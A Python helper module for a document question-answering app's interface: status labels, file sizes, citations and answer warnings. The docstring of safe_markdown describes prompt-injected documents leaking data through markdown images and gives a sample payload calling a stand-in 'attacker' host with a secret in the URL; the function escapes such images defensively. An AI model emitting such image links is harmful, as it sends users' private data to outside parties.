"""Pure presentation helpers (no Streamlit, no network): easy to unit-test."""

from __future__ import annotations

import re
from typing import Any

IN_FLIGHT = {
    "pending",
    "validating",
    "queued",
    "processing",
    "extracting",
    "chunking",
    "embedding",
    "indexing",
}
TERMINAL = {"completed", "failed", "deleting"}

STATUS_LABEL = {
    "pending": "Waiting",
    "validating": "Checking the file",
    "queued": "Queued",
    "processing": "Processing",
    "extracting": "Reading the text",
    "chunking": "Splitting into passages",
    "embedding": "Computing embeddings",
    "indexing": "Indexing",
    "completed": "Ready",
    "failed": "Failed",
    "deleting": "Deleting",
}

STAGE_LABEL = {
    "retrieving": "Searching your documents...",
    "generating": "Writing the answer...",
    "repairing": "Fixing the answer format...",
    "verifying": "Checking the citations...",
    "saving": "Saving the answer...",
}

ACCEPTED_TYPES = ["pdf", "docx", "txt", "md", "csv"]


def human_size(size_bytes: int) -> str:
    size = float(size_bytes)
    for unit in ("B", "KB", "MB", "GB"):
        if size < 1024 or unit == "GB":
            return f"{size:.0f} {unit}" if unit == "B" else f"{size:.1f} {unit}"
        size /= 1024
    return f"{size_bytes} B"  # unreachable; keeps the type checker honest


def plural(count: int, noun: str) -> str:
    """ "1 page", "2 pages"."""
    return f"{count} {noun}" if count == 1 else f"{count} {noun}s"


def status_label(status: str) -> str:
    return STATUS_LABEL.get(status, status.capitalize())


def has_work_in_flight(documents: list[dict[str, Any]]) -> bool:
    return any(d.get("status") in IN_FLIGHT for d in documents)


def citation_line(index: int, citation: dict[str, Any]) -> str:
    page = citation.get("page_number")
    where = f", page {page}" if page else ""
    return f"[{index}] {citation['document_name']}{where}"


def answer_notices(response: dict[str, Any]) -> list[tuple[str, str]]:
    """(level, text) notes to show beside an answer: level is `info` or `warning`."""
    notes: list[tuple[str, str]] = []
    meta = response.get("metadata", {})
    degraded = set(meta.get("degraded", []))
    if "unverified_answer" in degraded:
        notes.append(
            (
                "warning",
                "The model's answer could not be verified against your documents, so it was "
                "not shown. Try rephrasing the question.",
            )
        )
    elif response.get("insufficient_evidence"):
        notes.append(("info", "Your documents do not seem to contain enough to answer this."))
    if response.get("clarification_needed"):
        notes.append(("info", "Could you add a few more details to the question?"))
    if degraded - {"unverified_answer"}:
        notes.append(
            ("info", "Some optional steps were skipped, so the result may be less precise.")
        )
    return notes


def preview_title(text: str, limit: int = 40) -> str:
    one_line = " ".join(text.split())
    return one_line if len(one_line) <= limit else one_line[: limit - 1] + "…"


_IMAGE = re.compile(r"!\[")
_HTML_IMG = re.compile(r"<\s*img", re.IGNORECASE)


def safe_markdown(text: str) -> str:
    """Model answers and document excerpts are untrusted. Streamlit already escapes HTML, but
    markdown images would still make the browser fetch an outside URL as soon as the answer is
    shown, a classic way to leak data through a prompt-injected document
    (`![x](https://attacker/?q=<secret>)`). Images are therefore shown as text, never loaded;
    ordinary links stay clickable but are never fetched on their own."""
    return _HTML_IMG.sub("&lt;img", _IMAGE.sub(r"!\[", text))


STAGE_PROGRESS = {
    "pending": 0.05,
    "validating": 0.1,
    "queued": 0.15,
    "processing": 0.25,
    "extracting": 0.4,
    "chunking": 0.6,
    "embedding": 0.75,
    "indexing": 0.9,
}


def stage_progress(status: str) -> float:
    """How far along a document is, for the progress bar while it is processed (KI-049)."""
    return STAGE_PROGRESS.get(status, 1.0 if status == "completed" else 0.0)
